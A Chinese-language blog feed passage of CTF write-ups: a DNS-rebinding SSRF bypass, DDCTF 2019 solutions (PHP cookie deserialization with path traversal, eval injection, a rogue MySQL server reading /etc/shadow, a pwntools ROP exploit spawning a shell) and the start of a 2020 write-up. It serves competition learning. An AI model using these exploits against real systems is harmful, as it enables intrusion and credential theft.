<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(path=&#123;<span class="string">"/you_will_never_find_this_interface"</span>&#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">YouWillNeverFindThisInterface</span><span class="params">(@RequestParam(value=<span class="string">"url"</span>, defaultValue=<span class="string">""</span>)</span> String url)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (url.isEmpty()) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"`url` cant be empty!"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">	URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">	</span><br><span class="line">	String domain = u.getHost();</span><br><span class="line">	String ip = InetAddress.getByName(domain).getHostAddress();</span><br><span class="line">	<span class="keyword">if</span> (ip.equals(<span class="string">"127.0.0.1"</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"Dont be evil. Dont request 127.0.0.1."</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	URLConnection connection = u.openConnection();</span><br><span class="line">	connection.setConnectTimeout(<span class="number">5000</span>);</span><br><span class="line">	connection.setReadTimeout(<span class="number">5000</span>);</span><br><span class="line">	BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(connection.getInputStream()));</span><br><span class="line">	StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">	String current;</span><br><span class="line">	<span class="keyword">while</span> ((current = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">		sb.append(current);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">catch</span> (Exception e)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"emmmmmmm, something went wrong: "</span> + e.getMessage();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意 <code>String ip = InetAddress.getByName(domain).getHostAddress();</code> 和 <code>URLConnection connection = u.openConnection();.</code> 在拿到 ip 以后, 是直接再用原来的链接打开, 而不是通过 ip 访问. 也就是说, 这里其实解析了两次域名 (如果没有缓存的话, 这个下面说)</p>
<p>这给我们了机会来绕过检测, 我们只要让 DNS 第一次返回一个不是 <code>127.0.0.1</code> 的地址, 第二次再返回 <code>127.0.0.1</code> 即可. 这样 <code>u.openConnection</code> 将会链接 <code>127.0.0.1</code>, 实现 SSRF.</p>
<p>可以直接在 Github 上找到已有的<a href="https://github.com/Crypt0s/FakeDns" target="_blank" rel="noopener">项目</a>, 试了一下还是不错的. 不过在这个题目下使用有点小问题, 题目这里设置的 DNS 服务器是 <code>8.8.8.8</code>, 而 <code>8.8.8.8</code> 在递归的时候请求了一个不支持的类型 \x00\xff, 查了一下 <a href="https://tools.ietf.org/html/rfc1035" target="_blank" rel="noopener">RFC</a>, 是这个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3.2.3. QTYPE values</span><br><span class="line"></span><br><span class="line">QTYPE fields appear in the question part of a query.  QTYPES are a</span><br><span class="line">superset of TYPEs, hence all TYPEs are valid QTYPEs.  In addition, the</span><br><span class="line">following QTYPEs are defined:</span><br><span class="line"></span><br><span class="line">AXFR            252 A request for a transfer of an entire zone</span><br><span class="line"></span><br><span class="line">MAILB           253 A request for mailbox-related records (MB, MG or MR)</span><br><span class="line"></span><br><span class="line">MAILA           254 A request for mail agent RRs (Obsolete - see MX)</span><br><span class="line"></span><br><span class="line">\*               255 A request for all records</span><br></pre></td></tr></table></figure>

<p>请求所有记录, 还好不是什么奇葩的, 我们稍微修改一下, 正常返回 A 记录即可.</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="meta">@@ -52,7 +53,8 @@</span></span><br><span class="line">TYPE = &#123;</span><br><span class="line">     "\x00\x0c": "PTR",</span><br><span class="line">     "\x00\x10": "TXT",</span><br><span class="line">     "\x00\x0f": "MX",</span><br><span class="line"><span class="deletion">-    "\x00\x06": "SOA"</span></span><br><span class="line"><span class="addition">+    "\x00\x06": "SOA",</span></span><br><span class="line"><span class="addition">+    "\x00\xff": "A"</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> # Stolen:</span><br><span class="line"><span class="meta">@@ -346,6 +348,7 @@</span></span><br><span class="line">CASE = &#123;</span><br><span class="line">     "\x00\x0c": PTR,</span><br><span class="line">     "\x00\x10": TXT,</span><br><span class="line">     "\x00\x06": SOA,</span><br><span class="line"><span class="addition">+    "\x00\xff": A,</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后设置 conf</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat dns.conf</span><br><span class="line">A .* 1.1.1.1,127.0.0.1</span><br></pre></td></tr></table></figure>

<p>就可以啦, 这样第一次请求返回 <code>1.1.1.1</code>, 第二次 <code>127.0.0.1</code>, 绕过了检测.</p>
<p>再说说缓存, 为了加快请求速度, 现在的操作系统都会将上次请求保存下来, 在一段时间内都会使用第一次请求的结果. 所以这种方式也有对应的局限. 我们可以看看题目的设置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HappyjavaApplication</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    Security.setProperty(<span class="string">"networkaddress.cache.negative.ttl"</span>, <span class="string">"0"</span>);</span><br><span class="line">    Security.setProperty(<span class="string">"networkaddress.cache.ttl"</span>, <span class="string">"0"</span>);</span><br><span class="line">    System.setProperty(<span class="string">"sun.net.spi.nameservice.nameservers"</span>, <span class="string">"8.8.8.8"</span>);</span><br><span class="line">    System.setProperty(<span class="string">"sun.net.spi.nameservice.provider.1"</span>, <span class="string">"dns,sun"</span>);</span><br><span class="line">    SpringApplication.run(HappyjavaApplication.class, args);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是将 <code>networkaddress.cache.ttl</code> 设到了 0, 相当于关闭了缓存, 所以才能这么玩 233</p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>DDCTF2019 Writeup</title>
    <url>/2019/04/25/DDCTF2019-Writeup/</url>
    <content><![CDATA[<p>历时 N 天, 滴滴终于审完了 Writeup, 终于可以发 wp 了, 我从 33 名到 16 名, 太真实了…<br>部分题目质量还是不错的 _(:з」∠)_, 因为要交上去, 所以就没截图了, 凑合看吧 (逃  </p>
<a id="more"></a>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h2><p><code>http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code> 中 <code>TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code><br>可以看出来是双层 base64 + 一层 base16, 解码得到 flag.jpg, 那么可以得到 index.php 就是 <code>TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</code>,<br>就可以直接读源码了, 然而并没有 flag, 也不能读 config.php,<br>跟着注释中的网址 <code>https://blog.csdn.net/FengBanLiuYun/article/details/80616607</code> 可以在同作者底下找到 vim 学习记录, 找到 <code>.practice.txt.swp</code> 但是直接访问 404…,<br>各种姿势尝试发现是 <code>practice.txt.swp</code>… 有毒, 得到 <code>f1ag!ddctf.php</code> 的提示, 用 <code>f1agconfigddctf.php</code> 绕过, 得到源码,<br>用 <code>f1ag!ddctf.php?k=data:,123&amp;uid=123</code> 即可绕过, 得到 flag.</p>
<h2 id="WEB-签到题"><a href="#WEB-签到题" class="headerlink" title="WEB 签到题"></a>WEB 签到题</h2><p>在 <code>/js/index.js</code> 找到验证逻辑, 通过 <code>didictf_username</code> 的 <code>header</code> 来验证, 随便试了个 <code>admin</code> 就通过了,<br>得到下一步地址 <code>/app/fL2XID2i0Cdh.php</code>,  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">    $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">    $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        $data = sprintf($data,$v);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>让 nickname 为 %s 就可以拿到 key, 通过双写绕过替换. 然后构造 Cookie 反序列化就可以了, 脚本如下  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"><span class="comment">// ... 省略</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Application();</span><br><span class="line">$a-&gt;path = <span class="string">"..././config/flag.txt"</span>;</span><br><span class="line">$s = serialize($a);</span><br><span class="line">$key = <span class="string">"EzblrbNS"</span>;</span><br><span class="line">$s .= md5($key . $s);</span><br><span class="line"><span class="keyword">echo</span> $s; <span class="comment">// O:11:"Application":1:&#123;s:4:"path";s:21:"..././config/flag.txt";&#125;5a014dbe49334e6dbb7326046950bee2</span></span><br></pre></td></tr></table></figure>
<p>把 <code>ddctf_id</code> 的值改成这个访问下就拿到 flag 了.</p>
<h2 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h2><p>目的很明确, 图片里面存在 <code>phpinfo()</code> 就给 flag随便传个图片, 下载下来发现有 <code>CREATOR: gd-jpeg</code>,<br>应该是在服务器端有二次处理, 不能通过 exif 啥的携带数据, 用 GIMP 创建一张 20x20 图片, 在本地测试了一下  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$img = imagecreatefromjpeg(<span class="string">'/home/rmb122/gd.jpg'</span>);</span><br><span class="line">imagejpeg($img, <span class="string">'/home/rmb122/gd-out.jpg'</span>, <span class="number">80</span>);</span><br></pre></td></tr></table></figure>
<p>010editor 可以解析格式, fuzz 发现在 ScanData 第三个字节后面写 phpinfo() 不会被处理掉, 传上去就拿到 flag 了.  </p>
<h2 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h2><p>审计源码, 发现  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">is_action = event[<span class="number">0</span>] == <span class="string">'a'</span> </span><br><span class="line">action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>) </span><br><span class="line">args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>) </span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">    event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>)) </span><br><span class="line">    ret_val = event_handler(args) </span><br><span class="line"><span class="keyword">except</span> RollBackException:</span><br></pre></td></tr></table></figure>
<p>取 event_handler 的时候没有过滤, 通过 <code>?action:funcname%23;...</code><br>也就是在名字后面加个 <code>#</code> 可以绕过必须有后缀的限制, 于是就可以构造<br><code>?action:trigger_event%23;action:buy;1000%23action:get_flag;1</code><br>就可以调用 <code>get_flag_handler</code> 了, 虽然不能直接得到 flag, 而且交易会回滚, 但是因为  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span> </span><br><span class="line">    session[<span class="string">'log'</span>].append(event) </span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:] </span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br></pre></td></tr></table></figure>
<p>有 log 的原因, 而且会存在 session 里面, 而 flask 的 session 内的数据是存在 cookie 里面的,<br>通过 <a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">session_cookie_manager</a> 直接就可以解码, 得到在 log 里面的 flag.</p>
<h2 id="大吉大利-今晚吃鸡"><a href="#大吉大利-今晚吃鸡" class="headerlink" title="大吉大利,今晚吃鸡~"></a>大吉大利,今晚吃鸡~</h2><p>通过浏览器插件 <code>wappalyzer</code> (应该是分析 Cookie 名称 <code>revel_session</code> 获取的) 可以得到后端是 go 写的,<br>盲猜有整数溢出, 最后试出来 <code>2 ** 32</code> 也就是 <code>4294967296</code> 可以溢出买到票, 里面比较迷,<br>还以为得什么洞拿到机器人的 token, 结果我自己又注册了个号, 发现可以直接自己移除自己…<br>然后写脚本不停自己移除自己就行了, 然后后端分配 id 还是在一个范围内随机的, 不是每次都是新 id, 而且访问速度还有限制<br>后面才能好久移除一个 233, 总之跑了好久移除完访问 <code>/index.html#/main/result</code> 直接拿到 flag.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">act = <span class="string">'rmb122'</span></span><br><span class="line">pwd = <span class="string">'rmb122sudo ufw status numbered'</span></span><br><span class="line">mainSess = requests.session()</span><br><span class="line">mainSess.get(<span class="string">f'http://117.51.147.155:5050/ctf/api/login?name=<span class="subst">&#123;act&#125;</span>&amp;password=<span class="subst">&#123;pwd&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">999</span>):</span><br><span class="line">    tmpact = <span class="string">'laioqoLKJHSLJDKHKJrmb122'</span> + <span class="string">'QAQ'</span> + str(i)</span><br><span class="line">    tmppwd = <span class="string">'zxczxczxczxcczx'</span></span><br><span class="line">    tmp = requests.session()</span><br><span class="line">    tmp.get(<span class="string">f'http://117.51.147.155:5050/ctf/api/register?name=<span class="subst">&#123;tmpact&#125;</span>&amp;password=<span class="subst">&#123;tmppwd&#125;</span>'</span>)</span><br><span class="line">    tmp.get(<span class="string">'http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296'</span>)</span><br><span class="line">    bill = tmp.get(<span class="string">'http://117.51.147.155:5050/ctf/api/search_bill_info'</span>).json()[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>]</span><br><span class="line">    tmp.get(<span class="string">f'http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=<span class="subst">&#123;bill&#125;</span>'</span>)</span><br><span class="line">    res = tmp.get(<span class="string">'http://117.51.147.155:5050/ctf/api/search_ticket'</span>).json()</span><br><span class="line">    id = res[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'id'</span>]</span><br><span class="line">    token = res[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'ticket'</span>]</span><br><span class="line">    res = mainSess.get(<span class="string">f'http://117.51.147.155:5050/ctf/api/remove_robot?id=<span class="subst">&#123;id&#125;</span>&amp;ticket=<span class="subst">&#123;token&#125;</span>'</span>).json()</span><br><span class="line">    print(res)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<h2 id="mysql弱口令"><a href="#mysql弱口令" class="headerlink" title="mysql弱口令"></a>mysql弱口令</h2><p>既然是客户端连服务端, 可以想到是 mysql 客户端的文件读取漏洞, 有现成的<a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">项目</a><br>然后一开始没发现 <code>agent.py</code> 里面是用的 <code>netstat</code>, 我用普通用户权限跑过不了检测 233, 就先去做上面一题了,<br>之后看了下源码用 <code>root</code> 跑就没问题了, 成功读 <code>/etc/passwd</code>, 接下来直接尝试读 <code>/etc/shadow</code>, 竟然读的了, 应该是 root 权限跑的 bot,<br>然后读 <code>/root/.bash_history</code> 可以得到 bot 源码路径, 发现提示 <code># flag in mysql  curl@localhost database:security  table:flag</code>,<br>那么直接读数据库文件就可以了, <code>/var/lib/mysql/security/flag.ibd</code>, 拿到 flag.</p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Windows-Reverse1"><a href="#Windows-Reverse1" class="headerlink" title="Windows Reverse1"></a>Windows Reverse1</h2><p><code>upx -d</code> 直接脱壳, 但是不知道为什么跑不了 233, 最后还是用的 <code>ida</code> 动态调试原程序, 发现就是对输入的字符替换一下, 写个脚本就行  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sbox = <span class="string">'''~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(\x27&amp;%$#"! '''</span></span><br><span class="line">shift = <span class="number">32</span></span><br><span class="line">revSbox = &#123;&#125;</span><br><span class="line">flag = <span class="string">"DDCTF&#123;reverseME&#125;"</span></span><br><span class="line"><span class="keyword">for</span> seq, i <span class="keyword">in</span> enumerate(sbox):</span><br><span class="line">    revSbox[i] = chr(<span class="number">32</span> + seq)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    print(revSbox[i], end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Windows-Reverse2"><a href="#Windows-Reverse2" class="headerlink" title="Windows Reverse2"></a>Windows Reverse2</h2><p>用了没听说过的壳, 于是就手动找 OEP 脱了, 然而也跑不了, 只能 F5 233, 不过这也足够了, 发现第一层<br>就是 hex2bin, 然后第二层用了 std::string, 看不出来是啥, 动态调发现其实就是个 base64encode, 结果是 <code>reverse+</code> 就通过<br>那么同样一个脚本搞定  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'reverse+'</span></span><br><span class="line">flag = base64.b64decode(flag)</span><br><span class="line">flag = base64.b16encode(flag)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="真-签到题"><a href="#真-签到题" class="headerlink" title="真-签到题"></a>真-签到题</h2><p>公告最底下就是啦</p>
<h2 id="北京地铁"><a href="#北京地铁" class="headerlink" title="北京地铁"></a>北京地铁</h2><p>不得不说这题脑洞是真的大… <code>Stegsolve.jar</code> 可以直接提取出隐写的东西, 但是不知道有啥用…<br>最后提示三放出来以后, 谷歌搜图搜到原图, 发现把二号线的颜色给换了, <code>号</code> 和 <code>线</code> 字周围的颜色不一致就是没 PS 好,<br>233, 然后找了半天差别, 发现 <code>魏公村</code> 的颜色跟别的站点不一样, 随便试了一下拼音发现竟然就是秘钥, 惊了…<br>爆破了半天没出来, 没想到秘钥居然是这个.  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(key)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> key + <span class="string">b'\x00'</span> * (<span class="number">16</span> - len(key) % <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in product(*([ascii_lowercase] * count)):</span></span><br><span class="line"><span class="comment"># for count in range(1, 17):</span></span><br><span class="line">i = <span class="string">'weigongcun'</span></span><br><span class="line">c = <span class="string">"iKk/Ju3vu4wOnssdIaUSrg=="</span></span><br><span class="line">c = base64.b64decode(c)</span><br><span class="line">a = AES.new(padding(i.encode()), AES.MODE_ECB)</span><br><span class="line">res = a.decrypt(c)</span><br><span class="line"><span class="keyword">if</span> res[:<span class="number">2</span>] == <span class="string">b"DDCTF"</span>:</span><br><span class="line">        print(i)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<h2 id="MulTzor"><a href="#MulTzor" class="headerlink" title="MulTzor"></a>MulTzor</h2><p>感觉是 xor, 随手丢到之前看<a href="https://ctftime.org/writeup/3656" target="_blank" rel="noopener">老外</a>做题发现的<a href="https://github.com/nccgroup/featherduster" target="_blank" rel="noopener">工具</a>,<br>autopwn 一下直接就出 flag 了, 不得不说太强了. </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] Running multi-byte XOR brute force attack...</span><br><span class="line"></span><br><span class="line">Best candidate decryptions for M�fjc�ab~Z[�2e...:</span><br><span class="line">----------------------------------------</span><br><span class="line"></span><br><span class="line">Trying keysize 24</span><br><span class="line">Processing chunk 24 of 78</span><br><span class="line">Trying keysize 18</span><br><span class="line">Processing chunk 42 of 78</span><br><span class="line">Trying keysize 36</span><br><span class="line">Processing chunk 78 of 78</span><br><span class="line"></span><br><span class="line">....省略</span><br><span class="line"></span><br><span class="line">The flag is: DDCTF&#123;07b1b46d1db28843d1fd76889fea9b36&#125;</span><br></pre></td></tr></table></figure>

<h2 id="PWN-strike"><a href="#PWN-strike" class="headerlink" title="[PWN] strike"></a>[PWN] strike</h2><p>read 不会在读取的数据后面加 \x00, 于是就可以通过 fprintf 泄露 setbuf 地址,<br>然后算出基地址. password 长度输 -1, 就可以绕过长度限制, 直接栈溢出, 之后就是 rop 了.  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">p.recvuntil(<span class="string">'username:'</span>)</span><br><span class="line">p.send(<span class="string">'1'</span>* <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">t = p.recvuntil(<span class="string">'Plea'</span>)</span><br><span class="line">libcleak = u32(t[<span class="number">0x33</span>:<span class="number">0x37</span>])  </span><br><span class="line">stackButtom =  u32(t[<span class="number">0x2f</span>:<span class="number">0x33</span>])</span><br><span class="line">stack = stackButtom + <span class="number">0x18</span></span><br><span class="line">libcbase = libcleak - <span class="number">0x00065465</span></span><br><span class="line"><span class="comment"># print hex(stack)</span></span><br><span class="line"><span class="comment"># print hex(libcbase)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'password:'</span>)</span><br><span class="line">p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'):'</span>)</span><br><span class="line">binsh = libcbase + <span class="number">0x0015902B</span></span><br><span class="line"><span class="comment"># execve = libcbase + 0x000AF590</span></span><br><span class="line">system = libcbase + <span class="number">0x0003A940</span></span><br><span class="line">payload = p32(stack)*((<span class="number">0x4c</span>+<span class="number">0x18</span>)/<span class="number">4</span> - <span class="number">1</span>) + p32(system) + p32(binsh) *<span class="number">4</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p>找 HTTP 流量, 可以找到几张图, 有一张图损坏无法打开, 发现 crc 不对, 修复一下就是秘钥,<br>得到 <code>57pmYyWt</code>, 然而不知道是啥隐写, 最后通过流量记录发现访问过 <code>http://tools.jb51.net/</code>,<br>可以在上面找到一个图片隐写, 把图片都试了一下最后发现那张比较大的图片可以解出 flag,  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag+AHs-44444354467B5145576F6B63704865556F32574F6642494E37706F6749577346303469526A747D+AH0-</span><br></pre></td></tr></table></figure>
<p>把里面的 <code>44444354467B5145576F6B63704865556F32574F6642494E37706F6749577346303469526A747D</code>, 解个 hex 就拿到 flag.  </p>
<h2 id="联盟决策大会"><a href="#联盟决策大会" class="headerlink" title="联盟决策大会"></a>联盟决策大会</h2><p>Shamir 秘密分享方案, 密码学刚学, 在 <a href="https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing" target="_blank" rel="noopener">wiki</a> 上有个挺好的脚本,<br>题目相当于用两次 Shamir, 这样就可以让两个组织都到才能解密, 把脚本照着这个思路稍微改一下就能拿到 flag,  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> division</span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 12th Mersenne Prime</span></span><br><span class="line"><span class="comment"># (for this application we want a known prime number as close as</span></span><br><span class="line"><span class="comment"># possible to our security level; e.g.  desired security level of 128</span></span><br><span class="line"><span class="comment"># bits -- too large and all the ciphertext is large; too small and</span></span><br><span class="line"><span class="comment"># security is compromised)</span></span><br><span class="line">_PRIME = <span class="number">0xC53094FE8C771AFC900555448D31B56CBE83CBBAE28B45971B5D504D859DBC9E00DF6B935178281B64AF7D4E32D331535F08FC6338748C8447E72763A07F8AF7</span></span><br><span class="line"><span class="comment"># 13th Mersenne Prime is 2**521 - 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ... 省略</span></span><br><span class="line"></span><br><span class="line">t1 = (<span class="number">1</span>,<span class="number">0x30A152322E40EEE5933DE433C93827096D9EBF6F4FDADD48A18A8A8EB77B6680FE08B4176D8DCF0B6BF50000B74A8B8D572B253E63473A0916B69878A779946A</span>)</span><br><span class="line">t2 = (<span class="number">2</span>,<span class="number">0x1B309C79979CBECC08BD8AE40942AFFD17BBAFCAD3EEBA6B4DD652B5606A5B8B35B2C7959FDE49BA38F7BF3C3AC8CB4BAA6CB5C4EDACB7A9BBCCE774745A2EC7</span>)</span><br><span class="line">t3 = (<span class="number">4</span>,<span class="number">0x1E2B6A6AFA758F331F2684BB75CC898FF501C4FCDD91467138C2F55F47EB4ED347334FAD3D80DB725ABF6546BD09720D5D5F3E7BC1A401C8BD7300C253927BBC</span>)</span><br><span class="line">t4 = (<span class="number">3</span>,<span class="number">0x300991151BB6A52AEF598F944B4D43E02A45056FA39A71060C69697660B14E69265E35461D9D0BE4D8DC29E77853FB2391361BEB54A97F8D7A9D8C66AEFDF3DA</span>)</span><br><span class="line">t5 = (<span class="number">4</span>,<span class="number">0x1AAC52987C69C8A565BF9E426E759EE3455D4773B01C7164952442F13F92621F3EE2F8FE675593AE2FD6022957B0C0584199F02790AAC61D7132F7DB6A8F77B9</span>)</span><br><span class="line">t6 = (<span class="number">5</span>,<span class="number">0x9288657962CCD9647AA6B5C05937EE256108DFCD580EFA310D4348242564C9C90FBD1003FF12F6491B2E67CA8F3CC3BC157E5853E29537E8B9A55C0CF927FE45</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'''main function'''</span></span><br><span class="line">    shares = [t1,t2,t3]</span><br><span class="line">    shares2 = [t4,t5,t6]</span><br><span class="line">    a = recover_secret(shares)</span><br><span class="line">    b = recover_secret(shares2)</span><br><span class="line">    t7 = (<span class="number">1</span>, a)</span><br><span class="line">    t8 = (<span class="number">2</span>, b)</span><br><span class="line">    c = recover_secret([t7, t8])</span><br><span class="line">    c = hex(c)[<span class="number">2</span>:]</span><br><span class="line">    print(c)</span><br><span class="line">    print(bytes.fromhex(c))</span><br><span class="line">    <span class="comment">#shares = []</span></span><br><span class="line">    <span class="comment">#a = recover_secret(shares)</span></span><br><span class="line">    <span class="comment">#print(a)</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>ddctf</tag>
      </tags>
  </entry>
  <entry>
    <title>DDCTF 2020 Writeup</title>
    <url>/2020/09/07/DDCTF-2020-Writeup/</url>
    <content><![CDATA[<p>今年改了赛制, 可以两人组队, 我觉得改的还是不错的, 终于不用现场表演学习逆向和 pwn 了, 成功和 Ary 师傅打到了第三 233</p>
<a id="more"></a>

<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h3><p>访问 <a href="http://117.51.136.197/hint/1.txt" target="_blank" rel="noopener">http://117.51.136.197/hint/1.txt</a> 得到使用说明，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;117.51.136.197&#x2F;admin&#x2F;login -d &#39;username&#x3D;1&amp;pwd&#x3D;1&#39; -vv</span><br></pre></td></tr></table></figure>
<p>拿到 token</p>
